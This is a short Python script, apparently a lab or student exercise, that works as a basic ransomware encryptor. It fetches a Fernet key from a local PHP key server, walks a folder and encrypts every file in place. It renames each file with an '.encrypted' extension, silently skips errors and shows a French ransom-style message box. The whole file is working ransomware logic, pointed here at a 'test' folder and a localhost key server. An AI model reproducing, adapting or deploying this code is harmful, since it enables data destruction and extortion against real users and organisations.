from urllib.request import urlopen
from cryptography.fernet import Fernet
import os
import win32api


def encrypt(thisKey, thisFolder):
    fernet = Fernet(thisKey)
    for path, subdirs, files in os.walk(thisFolder):
        for name in files:
            try:
                with open(os.path.join(path, name), 'rb') as file:
                    original = file.read()
                encrypted = fernet.encrypt(original)
                with open(os.path.join(path, name), 'wb') as encrypted_file:
                    encrypted_file.write(encrypted)
                os.rename(os.path.join(path, name), os.path.join(path, name) + ".encrypted")
            except:
                pass
    win32api.MessageBox(0, 'Vos fichier on ete encrypter', 'Encrypt', 0x00001000)


if __name__ == '__main__':
    key = str(urlopen('http://127.0.0.1/key/key_gen.php').read().decode())
    print('Key used : ' + key)

    encrypt(key, 'test')

